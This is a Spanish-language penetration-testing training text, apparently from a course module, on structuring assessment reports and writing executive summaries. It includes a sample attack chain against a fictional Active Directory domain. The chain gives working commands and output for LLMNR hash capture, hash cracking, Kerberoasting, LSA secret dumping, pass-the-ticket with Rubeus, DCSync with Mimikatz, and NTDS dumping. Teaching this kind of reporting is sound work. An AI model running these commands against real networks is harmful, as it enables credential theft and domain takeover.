Como se mencionó anteriormente, el informe es el principal producto por el que paga un cliente cuando contrata a su empresa para realizar una prueba de penetración. El informe es nuestra oportunidad de mostrar nuestro trabajo durante la evaluación y aportar al cliente el mayor valor posible. Idealmente, el informe estará libre de datos e información superfluos que lo "desordenen" o distraigan la atención de los problemas que estamos tratando de transmitir del panorama general de su postura de seguridad que estamos tratando de pintar. Todo el contenido del informe debe tener una razón para estar ahí y no queremos abrumar al lector (por ejemplo, ¡no pegue más de 50 páginas de resultados de la consola!). En esta sección, cubriremos los elementos clave de un informe y cómo podemos estructurarlo mejor para mostrar nuestro trabajo y ayudar a nuestros clientes a priorizar la remediación.
## Priorizar nuestros esfuerzos

Durante una evaluación, especialmente las más grandes, nos enfrentaremos a mucho "ruido" que debemos filtrar para enfocar mejor nuestros esfuerzos y priorizar los hallazgos. Como evaluadores, estamos obligados a revelar todo lo que encontramos, pero cuando nos llega una gran cantidad de información a través de escaneos y enumeraciones, es fácil perderse o concentrarse en las cosas equivocadas y perder el tiempo y potencialmente pasar por alto problemas de alto impacto. . Por eso es esencial que comprendamos el resultado que producen nuestras herramientas, que tengamos pasos repetibles (como scripts u otras herramientas) para examinar todos estos datos, procesarlos y eliminar falsos positivos o problemas informativos que podrían distraernos de la atención. el objetivo de la evaluación. La experiencia y un proceso repetible son claves para que podamos examinar todos nuestros datos y centrar nuestros esfuerzos en hallazgos de alto impacto, como fallas en la ejecución remota de código (RCE) u otros que puedan conducir a la divulgación de datos confidenciales. Vale la pena (y es nuestro deber) informar los hallazgos informativos, pero en lugar de dedicar la mayor parte de nuestro tiempo a validar estos problemas menores que no se pueden explotar, es posible que desee considerar consolidar algunos de ellos en categorías que le muestren al cliente que usted estaba al tanto. que los problemas existían, pero no pudo explotarlos de ninguna manera significativa (por ejemplo, 35 variaciones diferentes de problemas con SSL/TLS, un montón de vulnerabilidades DoS en una versión EOL de PHP, etc.).

Al comenzar con las pruebas de penetración, puede ser difícil saber qué priorizar, y podemos caer en agujeros de conejo al intentar explotar una falla que no existe o lograr que funcione un exploit PoC roto. El tiempo y la experiencia ayudan aquí, pero también debemos apoyarnos en la ayuda de los miembros superiores del equipo y de los mentores. Algo en lo que puede perder medio día podría ser algo que hayan visto muchas veces y podría decirle rápidamente si es un falso positivo o si vale la pena analizarlo. Incluso si no pueden darle una respuesta realmente rápida en blanco y negro, al menos pueden indicarle una dirección que le ahorre varias horas. Rodéate de personas con las que te sientas cómodo pidiendo ayuda y que no te hagan sentir como un idiota si no sabes todas las respuestas.

## Escribir una cadena de ataque

La cadena de ataque es nuestra oportunidad de mostrar la genial cadena de explotación que tomamos para afianzarnos, movernos lateralmente y comprometer el dominio. Puede ser un mecanismo útil para ayudar al lector a conectar los puntos cuando se utilizan múltiples hallazgos en conjunto y obtener una mejor comprensión de por qué ciertos hallazgos reciben la clasificación de gravedad que se les asigna. Por ejemplo, un hallazgo particular por sí solo puede serlo `medium-risk`, pero, combinado con una o dos cuestiones más, podría elevarlo a `high-risk`, y esta sección es nuestra oportunidad de demostrarlo. Un ejemplo común es el uso `Responder`para interceptar el tráfico NBT-NS/LLMNR y retransmitirlo a hosts donde la firma SMB no está presente. Puede volverse realmente interesante si se pueden incorporar algunos hallazgos que de otro modo podrían parecer intrascendentes, como usar una divulgación de información de algún tipo para guiarlo a través de un LFI para leer un archivo de configuración interesante, iniciar sesión en una aplicación externa y aprovechar. funcionalidad para obtener ejecución remota de código y un punto de apoyo dentro de la red interna.

Hay varias formas de presentar esto y su estilo puede diferir, pero veamos un ejemplo. Comenzaremos con un resumen de la cadena de ataque y luego recorreremos cada paso junto con la salida del comando de soporte y capturas de pantalla para mostrar la cadena de ataque lo más claramente posible. Una ventaja aquí es que podemos reutilizar esto como evidencia para nuestros hallazgos individuales, de modo que no tengamos que formatear las cosas dos veces y podamos copiarlos y pegarlos en el hallazgo relevante.

Empecemos. Aquí asumiremos que fuimos contratados para realizar una prueba de penetración interna contra la empresa `Inlanefreight`con una máquina virtual dentro de la infraestructura del cliente o en su oficina en nuestra computadora portátil conectada a un puerto Ethernet. Para nuestros propósitos, esta evaluación simulada se realizó desde un `non-evasive`punto de vista con un `grey box`enfoque, lo que significa que el cliente no intentaba activamente interferir con las pruebas y solo proporcionó rangos de red dentro del alcance y nada más. Pudimos comprometer el dominio interno `INLANEFREIGHT.LOCAL`durante nuestra evaluación.

Nota: También se puede encontrar una copia de esta cadena de ataques en el documento de informe de muestra adjunto.

## Cadena de ataque de muestra: prueba de penetración interna INLANEFREIGHT.LOCAL

Durante la prueba de penetración interna realizada contra Inlanefreight, el evaluador se afianzó en la red interna, se movió lateralmente y finalmente comprometió el `INLANEFREIGHT.LOCAL`dominio de Active Directory. El siguiente tutorial ilustra los pasos seguidos para pasar de un usuario anónimo no autenticado en la red interna a un acceso de nivel de administrador de dominio. La intención de esta cadena de ataque es demostrar a Inlanefreight el impacto de cada vulnerabilidad mostrada en este informe y cómo encajan para demostrar el riesgo general para el entorno del cliente y ayudar a priorizar los esfuerzos de remediación (es decir, parchear dos fallas rápidamente podría dividir la cadena de ataque mientras la empresa trabaja para solucionar todos los problemas informados). Si bien otros hallazgos mostrados en este informe podrían aprovecharse para obtener un nivel similar de acceso, esta cadena de ataque muestra el camino inicial de menor resistencia tomado por el evaluador para lograr comprometer el dominio.

1. El evaluador utilizó la herramienta [Responder](https://github.com/lgandx/Responder) para obtener un hash de contraseña NTLMv2 para un usuario de dominio, `bsmith`.
2. Este hash de contraseña se descifró con éxito fuera de línea utilizando la herramienta [Hashcat](https://github.com/hashcat/hashcat) para revelar la contraseña de texto sin cifrar del usuario, lo que le otorgó un punto de apoyo en el `INLANEFREIGHT.LOCAL`dominio, pero sin más privilegios que un usuario de dominio estándar.
3. Luego, el evaluador ejecutó la herramienta [BloodHound.py](https://github.com/fox-it/BloodHound.py) , una versión Python de la popular herramienta de recopilación [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) para enumerar el dominio y crear representaciones visuales de las rutas de ataque. Tras la revisión, el evaluador descubrió que existían varios usuarios privilegiados en el dominio configurado con nombres principales de servicio (SPN), que se pueden aprovechar para realizar un ataque Kerberoasting y recuperar tickets TGS Kerberos para las cuentas que se pueden descifrar sin conexión utilizando una `Hashcat`contraseña débil. Está establecido. A partir de aquí, el evaluador utilizó la herramienta [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) para llevar a cabo un ataque Kerberoasting dirigido contra la `mssqlsvc`cuenta, y descubrió que la `mssqlsvc`cuenta tenía derechos de administrador local sobre el host `SQL01.INLANEFREIGHT.LOCAL`, lo cual era un objetivo interesante en el dominio.
4. El evaluador descifró con éxito la contraseña de esta cuenta fuera de línea, revelando el valor de texto sin cifrar.
5. El evaluador se autenticó en el host `SQL01.INLANEFREIGHT.LOCAL`y recuperó una contraseña de texto sin cifrar del registro del host descifrando los secretos de LSA para una cuenta ( `srvadmin`), que estaba configurada para el inicio de sesión automático.
6. Esta `srvadmin`cuenta tenía derechos de administrador local sobre todos los servidores (aparte de los controladores de dominio) en el dominio, por lo que el evaluador inició sesión en el `MS01.INLANEFREIGHT.LOCAL`host y recuperó un ticket Kerberos TGT para un usuario que inició sesión, `pramirez`. Este usuario era parte del `Tier I Server Admins`grupo que otorgó a la cuenta derechos DCSync sobre el objeto de dominio. Este ataque se puede utilizar para recuperar el hash de contraseña NTLM de cualquier usuario del dominio, lo que resulta en un compromiso del dominio y persistencia a través de un Golden Ticket.
7. El evaluador utilizó la herramienta [Rubeus](https://github.com/GhostPack/Rubeus) para extraer el ticket Kerberos TGT del `pramirez`usuario y realizar un ataque Pass-the-Ticket para autenticarse como este usuario.  
8. Finalmente, el evaluador realizó un ataque DCSync después de autenticarse exitosamente con esta cuenta de usuario a través de la herramienta [Mimikatz](https://github.com/gentilkiwi/mimikatz) , lo que terminó comprometiendo el dominio.

#### Los pasos de reproducción detallados para esta cadena de ataque son los siguientes:

Al conectarse a la red, el evaluador inició la herramienta Responder y pudo capturar un hash de contraseña para el `bsmith`usuario falsificando el tráfico NBT-NS/LLMNR en el segmento de la red local.
#### Respondedor
```shell-session
lilscott6x9@htb[/htb]$  sudo responder -I eth0 -wrfv

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

 <SNIP>

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.195.168]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-TWWXTGD94CV]
    Responder Domain Name      [3BKZ.LOCAL]
    Responder DCE-RPC Port     [47032]

[+] Listening for events...

<SNIP>

[SMB] NTLMv2-SSP Client   : 192.168.195.205
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\bsmith
[SMB] NTLMv2-SSP Hash     : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FAAA50000000002000800330042004B005A0001001E00570049004E002D005400570057005800540047004400390034004300560004003400570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D801060004000200000008003000300000000000000001000000002000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100390035002E00310036003800000000000000000000000000

<SNIP>
```

El evaluador logró "descifrar" este hash de contraseña fuera de línea utilizando la herramienta Hashcat y recuperar el valor de la contraseña en texto sin cifrar, lo que permitió un punto de apoyo para enumerar el dominio de Active Directory.
#### Hashcat
```shell-session
lilscott6x9@htb[/htb]$ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a002e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f846a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED>
```

El evaluador procedió a enumerar las cuentas de usuario configuradas con nombres principales de servicio (SPN) que pueden estar sujetas a un ataque de Keberoasting. Esta técnica de movimiento lateral/escalada de privilegios se dirige a los SPN (identificadores únicos que utiliza Kerberos para asignar una instancia de servicio a una cuenta de servicio). Cualquier usuario de dominio puede solicitar un ticket Kerberos para cualquier cuenta de servicio en el dominio, y el ticket está cifrado con el hash de contraseña NTLM de la cuenta de servicio, que potencialmente puede "descifrarse" sin conexión para revelar el valor de la contraseña en texto claro de la cuenta.
#### Obtener UserSPN
```shell-session
lilscott6x9@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                         Name       MemberOf  PasswordLastSet             LastLogon  Delegation 
-------------------------------------------  ---------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433      mssqlsvc             2022-05-13 16:52:07.280623  <never>               
MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod              2022-05-13 16:54:52.889815  <never>               
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev               2022-05-13 16:54:57.905315  <never>               
MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                2022-05-13 16:55:03.421004  <never>               
backupjob/veam001.inlanefreight.local        backupjob            2022-05-13 18:38:17.740269  <never>               
vmware/vc.inlanefreight.local                vmwaresvc            2022-05-13 18:39:10.691799  <never> 
```

Luego, el evaluador ejecutó la versión Python de la popular herramienta de enumeración BloodHound Active Directory para recopilar información como usuarios, grupos, computadoras, ACL, membresía de grupos, propiedades de usuarios y computadoras, sesiones de usuarios, acceso de administrador local y más. Luego, estos datos se pueden importar a una herramienta GUI para crear representaciones visuales de las relaciones dentro del dominio y trazar "rutas de ataque" que pueden usarse para potencialmente moverse lateralmente o escalar privilegios dentro de un dominio.
#### BloodHound
```shell-session
lilscott6x9@htb[/htb]$ sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 503 computers
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 652 users

<SNIP>
```

El evaluador utilizó esta herramienta para verificar los privilegios de cada una de las cuentas SPN enumeradas en los pasos anteriores y notó que solo la `mssqlsvc`cuenta tenía privilegios más allá de un usuario de dominio estándar. Esta cuenta tenía acceso de administrador local a través del `SQL01`host. Los servidores SQL suelen ser objetivos de alto valor en un dominio, ya que contienen credenciales privilegiadas, datos confidenciales o incluso pueden tener un usuario con más privilegios conectad

![imagen](https://academy.hackthebox.com/storage/modules/162/bh_mssqlsvc.png)

Luego, el evaluador realizó un ataque Kerberoasting dirigido para recuperar el ticket Kerberos TGS para la `mssqlsvc`cuenta de servicio.
#### GetUserSPN.py
```shell-session
lilscott6x9@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                     Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------------  --------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433  mssqlsvc            2022-05-13 16:52:07.280623  <never>               


$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a3988485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c44ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf68286ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a897185716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP>
```

El evaluador logró "descifrar" esta contraseña sin conexión para revelar su valor de texto sin cifrar.
#### Hashcat
```shell-session
lilscott6x9@htb[/htb]$ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a<SNIP>:<REDACTED>
```

Esta contraseña podría usarse para acceder al `SQL01`host de forma remota y recuperar un conjunto de credenciales de texto sin cifrar del registro de la `srvadmin`cuenta.
#### CrackMapExec
```shell-session
lilscott6x9@htb[/htb]$ crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa

SMB         192.168.195.220 445    SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         192.168.195.220 445    SQL01            [+] INLANEFREIGHT.LOCAL\mssqlsvc:<REDACTED> 
SMB         192.168.195.220 445    SQL01            [+] Dumping LSA secrets
SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7bd0f186CCCCC450c5e8cb53228cc0
SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/srvadmin:$DCC2$10240#srvadmin#ef393703f3fabCCCCCa547caffff5f

<SNIP>

SMB         192.168.195.220 445    SQL01            INLANEFREIGHT\srvadmin:<REDACTED>

<SNIP>

SMB         192.168.195.220 445    SQL01            [+] Dumped 10 LSA secrets to /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.secrets and /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.cached
```

Con estas credenciales, el evaluador inició sesión en el `MS01`host a través de Escritorio remoto (RDP) y observó que otro usuario, `pramirez`, también estaba conectado actualmente.
#### Usuarios Conectados

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 pramirez              rdp-tcp#1           2  Active          3  5/14/2022 8:21 AM
>srvadmin              rdp-tcp#2           3  Active          .  5/14/2022 8:24 AM
```

El evaluador revisó la herramienta BloodHound y notó que este usuario podía realizar el ataque DCSync, una técnica para robar la base de datos de contraseñas de Active Directory aprovechando un protocolo utilizado por los controladores de dominio para replicar los datos del dominio. Este ataque se puede utilizar para recuperar hashes de contraseñas NTLM para cualquier usuario del dominio.

![imagen](https://academy.hackthebox.com/storage/modules/162/bh_pramirez.png)

Después de conectarse, el evaluador utilizó la herramienta Rubeus para ver todos los tickets de Kerberos disponibles actualmente en el sistema y notó que `pramirez`había tickets para el usuario.
#### rubeus
```powershell-session
PS C:\htb> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x256aef

 ------------------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                       | Service                                           | EndTime              |
 ------------------------------------------------------------------------------------------------------------------------
 | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:24:19 PM |
 | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:24:19 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | ProtectedStorage/DC01.INLANEFREIGHT.LOCAL         | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01.INLANEFREIGHT.LOCAL                     | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01                                         | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM |
 | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
 | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM 
```

Luego, el evaluador utilizó esta herramienta para recuperar el ticket Kerberos TGT para este usuario, que luego puede usarse para realizar un ataque de "pasar el ticket" y usar el ticket TGT robado para acceder a los recursos del dominio.
#### rubeus
```powershell-session
PS C:\htb> .\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x1a8b19
[*] Current LUID    : 0x256aef

  UserName                 : pramirez
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x1a8b19
  UserSID                  : S-1-5-21-1666128402-2659679066-1433032234-1108
  AuthenticationPackage    : Negotiate
  LogonType                : RemoteInteractive
  LogonTime                : 5/14/2022 8:21:35 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
  UserPrincipalName        : pramirez@INLANEFREIGHT.LOCAL


    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
    ServiceRealm             :  INLANEFREIGHT.LOCAL
    UserName                 :  pramirez
    UserRealm                :  INLANEFREIGHT.LOCAL
    StartTime                :  5/15/2022 3:51:35 AM
    EndTime                  :  5/15/2022 1:51:35 PM
    RenewTill                :  5/21/2022 8:21:35 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  3g/++VoJZ4ipbExARBCKK960cN+3juTKNHiQ8XpHL/k=
    Base64EncodedTicket   :

      doIFZDCCBWCgAwIBBaEDAgEWooIEVDCCBFBhgg<SNIP>

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

El usuario realizó el ataque de pase del boleto y se autenticó exitosamente como `pramirez`usuario.

```powershell-session
PS C:\htb> .\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>
```

Esto se confirmó mediante el `klist`comando para ver los tickets de Kerberos almacenados en caché en la sesión actual.

#### Tickets Kerberos almacenados en caché

```powershell-session
PS C:\htb> klist

Current LogonId is 0:0x256d1d

Cached Tickets: (1)

#0>     Client: pramirez @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 5/15/2022 3:51:35 (local)
        End Time:   5/15/2022 13:51:35 (local)
        Renew Time: 5/21/2022 8:21:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Luego, el evaluador utilizó este acceso para realizar un ataque DCSync y recuperar el hash de contraseña NTLM para la cuenta de administrador integrada, lo que condujo al acceso de nivel de administrador empresarial sobre el dominio.
#### Mimikatz
```powershell-session
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
[DC] ms-DS-ReplicationEpoch is: 1

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/12/2022 9:32:55 PM
Object Security ID   : S-1-5-21-1666128402-2659679066-1433032234-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: e4axxxxxxxxxxxxxxxx1c88c2e94cba2
```

El evaluador confirmó este acceso autenticándose en un controlador de dominio en el `INLANEFREIGHT.LOCAL`dominio.
#### CrackMapExec

```shell-session
lilscott6x9@htb[/htb]$ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2

SMB         192.168.195.204 445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.195.204 445    DC01             [+] INLANEFREIGHT.LOCAL\administrator e4axxxxxxxxxxxxxxxx1c88c2e94cba2 
```

Con este acceso, fue posible recuperar los hash de contraseña NTLM para todos los usuarios del dominio. Luego, el evaluador realizó el descifrado fuera de línea de estos hashes utilizando la herramienta Hashcat. En los apéndices de este informe se puede encontrar un análisis de contraseñas de dominio que muestra varias métricas.
#### Volviendo NTDS con SecretsDump

```shell-session
lilscott6x9@htb[/htb]$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cxxxxxxxxxx7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4180f1f4xxxxxxxxxx0e8523771a8c:::
mssqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:55a6c7xxxxxxxxxxxx2b07e1:::
srvadmin:1107:aad3b435b51404eeaad3b435b51404ee:9f9154fxxxxxxxxxxxxx0930c0:::
pramirez:1108:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9xxxxxxxxxxxxxed5c58:::

<SNIP>
```

---

## Redactar un sólido resumen ejecutivo

Es `Executive Summary`una de las partes más importantes del informe. Como se mencionó anteriormente, nuestros clientes finalmente pagan por el informe entregable, que tiene varios propósitos además de mostrar debilidades y pasos de reproducción que pueden utilizar los equipos técnicos que trabajan en la remediación. Es probable que el informe sea visto en parte por otras partes interesadas internas, como Auditoría Interna, Gestión de TI y Seguridad de TI, Gestión de nivel C e incluso la Junta Directiva. El informe se puede utilizar para validar la financiación del año anterior para infosec o para solicitar financiación adicional para el año siguiente. Por este motivo, debemos asegurarnos de que el contenido del informe sea fácilmente comprensible para personas sin conocimientos técnicos.
#### Conceptos clave
La audiencia prevista `Executive Summary`suele ser la persona responsable de asignar el presupuesto para solucionar los problemas que descubrimos. Para bien o para mal, es probable que algunos de nuestros clientes hayan estado tratando de obtener financiación para solucionar los problemas presentados en el informe durante años y tengan la intención de utilizar el informe como munición para finalmente hacer algunas cosas. Esta es nuestra mejor oportunidad para ayudarlos. Si perdemos nuestra audiencia aquí y hay limitaciones presupuestarias, el resto del informe puede perder rápidamente su valor. Algunas cosas clave que se deben asumir (que pueden ser ciertas o no) para maximizar la efectividad del `Executive Summary`son:

- Debería ser obvio, pero debería estar escrito para alguien que no sea técnico en absoluto. El barómetro típico para esto es "si tus padres no pueden entender cuál es el punto, entonces debes intentarlo de nuevo" (suponiendo que tus padres no sean CISO ni administradores de sistemas o algo por el estilo).
    
- El lector no hace esto todos los días. No saben qué hace Rubeus, qué significa rociar contraseñas o cómo es posible que las entradas puedan otorgar entradas diferentes (o probablemente incluso qué es una entrada, aparte de un trozo de papel para entrar a un concierto o un juego de pelota).
    
- Esta puede ser la primera vez que pasan por una prueba de penetración.
    
- Al igual que el resto del mundo en la era de la gratificación instantánea, su capacidad de atención es pequeña. Cuando lo perdemos, es extraordinariamente improbable que lo recuperemos.
    
- En la misma línea, a nadie le gusta leer algo en el que tienen que buscar en Google lo que significan las cosas. Eso se llama distracciones.
    

Analicemos una lista de lo que se debe y no se debe hacer al redactar un documento eficaz `Executive Summary`.

#### Hacer

- `When talking about metrics, be as specific as possible.`- Palabras como "varios", "múltiples" y "pocos" son ambiguas y podrían significar 6 o 500. Los ejecutivos no buscarán esta información en el informe, así que si van a hablar de esto, dejen que ellos saben lo que tienes; de lo contrario, perderás su atención. La razón más común por la que las personas no se comprometen con un número específico es para dejarlo abierto en caso de que el consultor haya omitido uno. Puede realizar cambios menores en el lenguaje para tener en cuenta esto, como "si bien puede haber casos adicionales de X, en el tiempo asignado a la evaluación, observamos 25 casos de X".
    
- `It's a summary. Keep it that way.`- Si escribiste más de 1,5 o 2 páginas, probablemente hayas sido demasiado detallado. Examine los temas de los que habló y determine si se pueden agrupar en categorías de nivel superior que podrían incluirse en políticas o procedimientos específicos.
    
